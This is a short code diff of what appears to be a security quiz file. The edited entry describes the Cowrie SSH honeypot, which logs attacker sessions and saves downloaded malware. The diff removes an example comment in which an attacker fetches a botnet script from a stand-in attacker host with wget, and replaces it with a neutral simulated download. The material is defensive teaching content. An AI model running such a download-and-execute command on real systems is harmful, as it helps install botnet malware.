@@ -19,7 +19,7 @@ const questions = [
     hint: "A popular fake SSH honeypot that records keystrokes and saves downloaded malware files.",
     level: "Basic",
     codeExample: `// Cowrie Session Recording:
-// Attacker runs: wget http://attacker.com/botnet.sh
+// Simulated Session: curl -s https://test-archive.local/sample.bin
 // Cowrie Action: Downloads file to /var/lib/cowrie/downloads/ and logs SHA-256 hash!`
   },
   {
